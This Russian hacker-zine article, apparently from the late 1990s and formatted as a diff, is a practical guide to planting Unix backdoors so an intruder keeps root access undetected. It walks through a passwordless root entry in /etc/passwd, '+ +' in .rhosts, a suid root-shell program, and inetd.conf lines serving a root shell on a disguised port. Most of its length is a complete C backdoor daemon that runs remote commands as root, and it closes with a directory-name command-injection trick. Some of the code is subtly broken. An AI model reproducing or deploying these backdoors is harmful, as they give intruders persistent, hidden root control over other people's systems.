@@ -1,0 +1,301 @@
+ backdoors - это же просто!                                        by napalmed
+
+ почитал я текст, который наваяли умельцы из infinity void (который вообще уже
+ давно путешествует отдельно от журнала в виде файла backdoor.txt) и понял - а
+ ведь они не правы!!! во-первых в статье несколько ошибок, особенно в скриптах.
+ но и не в этом речь! я тоже могу придумать полторы тысячи идей - читатель же
+ наверное не этого хочет? а наверное практических рекомендаций. да, лично мне
+ backdoor.txt помог в свое время (1996) сильно - я идеи черпал только оттуда, а
+ на то время некому было меня ловить.
+ сейчас уже давно прошла дифференциация на тех, кто начинал во время/до распро-
+ странения internet в нашей стране и на тех, кто после. так вот, эта статья для
+ тех, кто после :)
+
+ зачем нужны backdoor-ы?
+
+ все очень просто. конечно можно хакнуть систему, снести web-сайт, повесить там
+ гитлера и радоваться. а можно лазить беспрепятственно очень, очень долго. вот
+ для этого мы и используем backdoors.
+
+ самые простые
+
+ совсем просто - воткнуть беспарольного (или с паролем) рута в /etc/passwd. или
+ например добавить в rhosts строчку '+ +'.
+
+ можно вешать скрипты на crontab. не совсем так, как описано в infinity void, а
+ скорее так, как это исправил seltorn в переводе этой статьи. однако мы сделаем
+ еще лучше :) примерно так:
+
+ root@slayerhouse /root # crontab -l
+ 0,5,10,15,20,25,30,35,40,45,50,55 * * * *       /usr/lib/atrun 1>
+ /dev/null 2> /dev/null
+
+ и все. каждые пять минут будут открыватся все порты. однако и это достаточно
+ простые вещи. а на свете есть много чего кроме простых вещей. мы же можем наш
+ backdoor написать сами! :) или использовать мои наработки, что проще.
+
+ main(int argc, char *argv[])
+ {
+    if (argc != 2)
+         {
+           printf("usage: %s file name\n", argv[0]);
+           exit(1);
+         }
+      if (!strcmp(argv[0],"/* enter here your passwd */"))
+           {
+             setuid(0);
+             setgid(0);
+             system("/bin/csh");
+           }
+       else
+           printf("%s : %s file has been backed!\n", argv[0], argv[1]);
+ }
+
+ теперь мы просто ставим suid-ность, делаем рутовым, но world executeable. и
+ все! :) однако все это достаточно простые backdoor-ы, которые нормальный админ
+ найдет без особого напряга.
+
+ можно поставить backdoor как сервис в inetd. это тоже достаточно простая техни-
+ ка. находим в /etc/services незанятый порт (или занятый, но ненужный) и тыкаем
+ в /etc/inetd.conf по соответствующему сервису нужную нам строку:
+
+ ftp     stream  tcp     nowait  root  /bin/sh     sh -i
+
+ проверим, как же теперь это все будет работать:
+
+ victim# killall -HUP inetd
+ victim# inetd
+ victim# logoff
+ slayerhouse> open victim.com 32
+ Trying 194.20.78.211...
+ Connected to victim.com
+ Escape character is '^]'.
+ bash#
+ bash# whoami
+ root
+ bash#
+
+ уот :) мы достигли своей цели в очередной раз. может теперь стоит попробовать
+ добавить свой собственный сервис? но он должен выглядеть, как что-то важное!
+ вот обрывок /etc/services:
+
+ netbios-ssn     139/tcp         nbssn
+ netbkup         142/tcp         netbkup
+ imap            143/tcp
+ NeWS            144/tcp         news
+ snmp            161/udp
+
+ вам ничего не кажется подозрительным? ага, порт 142! нет на свете такого серви- са! а теперь пропишем сервис в /etc/inetd.conf:
+
+ ftp     stream  tcp     nowait  root    /usr/sbin/tcpd  in.ftpd -l -a
+ telnet  stream  tcp     nowait  root    /usr/sbin/tcpd  in.telnetd
+ gopher  stream  tcp     nowait  root    /usr/sbin/tcpd  gn
+ netbkup stream  tcp     nowait  root    /bin/sh         sh -i
+
+ теперь можно лезть на порт 142.
+
+ и еще сложнее...
+
+ что теперь? все просто - мы напишем свой полноценный backdoor daemon! он будет
+ сидеть на седьмом порту и ждать пароля, после чего беспрепятственно пустит че-
+ ловека в систему.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <string.h>
+
+/* DEFINE THESE!!!!! */
+
+/* Port Im Running On.. (just in case)  */
+#define PORTON 7
+
+/* The Word Ill See When U Come In :)   */
+#define PASSWORD "b4st4rd"
+
+/* File I Will Use For Output To You..  */
+#define OFON "/etc/output.file"
+
+/* Where Should I Log Attempts?         */
+/* /dev/null for no log                 */
+#define ELOG "/etc/backgate.log"
+
+void runitwo(int thed);
+void runitwoo(int thed);
+int sendfileout(int thd);
+
+void main()
+{
+        struct sockaddr_in my_addr;
+        struct sockaddr_in th_addr;
+        FILE *fout;
+        int sfd, nsfd;
+        int sin_size;
+        char buf[300];
+        int n;
+
+        if ( (fout = fopen(ELOG, "a")) == NULL)
+        {
+                printf("\nError Opening Log File\n");
+                exit(1);
+        }
+
+        my_addr.sin_family = AF_INET;
+        my_addr.sin_port = htons(PORTON);
+        my_addr.sin_addr.s_addr = INADDR_ANY;
+        bzero(&(my_addr.sin_zero), 8);
+
+        if( (sfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        {
+                printf("\nError Socket...\n");
+                exit(1);
+        }
+
+        if(bind(sfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1)
+        {
+                printf("\nError Binding Socket...\n");
+                exit(1);
+        }
+
+        if(listen(sfd, 2) == -1)
+        {
+                printf("\nError Linstening...\n");
+                exit(1);
+        }
+
+        while(1)
+        {
+                sin_size = sizeof(struct sockaddr_in);
+                if( (nsfd = accept(sfd, (struct sockaddr *)&th_addr, &sin_size)) == -1)
+                        exit(1);
+                fprintf(fout, "Connect From: %s\n", inet_ntoa(th_addr.sin_addr));
+                if(!fork())
+                {
+                        n = recv(nsfd, buf, 300, 0);
+                        buf[n]='\0';
+                        if((strstr(buf, PASSWORD)) != NULL)
+                                runitwo(nsfd);
+                        send(nsfd, buf, strlen(buf), 0);
+                        close(nsfd);
+                        exit(0);
+                }
+                close(nsfd);
+
+                while(waitpid(-1,NULL,WNOHANG) > 0);
+        }
+}
+
+void runitwo(int thed)
+{
+    int rcvc;
+    char atc[50]=" > ";
+    char com[540];
+    send(thed, "\n :: welcome to the backgated machine ::\n", 44, 0);
+    send(thed, "Term: WO: With Output\n", 23, 0);
+    strcat(atc, OFON);
+    while(1)
+    {
+        bzero(com, 540);
+        send(thed, "\nbash# ", 8, 0);
+        rcvc = recv(thed, com, 500, 0);
+        com[strlen(com)-2] = '\0';
+        if(strcmp(com, ""))
+        {
+                if((strstr(com, "exit")) == com)
+                        exit(0);
+                if((strstr(com, "term-woo")) == com)
+                        runitwoo(thed);
+                strcat(com, atc);
+                system(com);
+                sendfileout(thed);
+        }
+    }
+    exit(0);
+}
+
+int sendfileout(int thd)
+{
+        FILE *frp;
+        char fin[500];
+        int cbl;
+        int bs;
+        char *res;
+        char *res2;
+        char *filen=OFON;
+        if( (frp = fopen(filen, "r")) == NULL)
+        {
+                send(thd, "Cant Read Program Output...\n", 30, 0);
+                return 0;
+        }
+
+        do
+        {
+                strcpy(fin, "");
+                fgets(fin, 500, frp);
+                cbl = strlen(fin);
+                if( (bs = send(thd, fin, cbl, 0)) < cbl )
+                {
+                        res=fin;
+                        res+=bs;
+                        cbl=strlen(res);
+                        if( (bs = send(thd, res, cbl, 0)) < cbl )
+                        {
+                                res2=res;
+                                res2+=bs;
+                                cbl=strlen(res);
+                                send(thd, res2, cbl, 0);
+                        }
+                }
+        }while(!feof(frp));
+
+        close(frp);
+        remove(OFON);
+        return 1;
+}
+
+void runitwoo(int thed)
+{
+    int rcvc;
+    char com[540];
+    send(thed, "\n :: welcome to the backgated machine ::\n", 44, 0);
+    send(thed, "Term: WOO: WithOut Output\n", 27, 0);
+    while(1)
+    {
+        bzero(com, 540);
+        send(thed, "\nbash# ", 8, 0);
+        rcvc = recv(thed, com, 500, 0);
+        com[strlen(com)-2] = '\0';
+        if(strcmp(com, ""))
+        {
+                if(!strcmp(com, "exit"))
+                        exit(0);
+                if(!strcmp(com, "term-wo"))
+                        runitwo(thed);
+                system(com);
+        }
+    }
+    exit(0);
+}
+
+ слово напоследок
+
+ достаточно много элегантных дырок в заборе можно проделать используя глюки сис-
+ темы. вот например такой:
+
+ #mkdir "\ `echo -e \ "echo + +> ~\57.rhosts\ " > x; source x; rm -f \x\ ` "
+
+ если теперь кто-то из bash (или из mc, запущеного из-под bash) зайдет в эту ди-
+ ректорию - произойдет понятно что. проверено сие только на linux-е, однако я
+ думаю, что этот баг присущ всем платформам, на которых есть bash.
+
+ в бонуле лежит набор самых разных бэкдоров, собраных со всей сети. ессно их пи-
+ сал не я, да я и не претендую. есть там и мои мелкие бэкдоры, слепленые на ско-
+ рую руку в экстремальных условиях.
+
+ вот наверное и все. скорее всего в следующем выпуске будет продолжение о более
+ сложных backdoor-ах, о установке симбионтов с программами, о установке троянцев
+ в ядро. bye, guys.
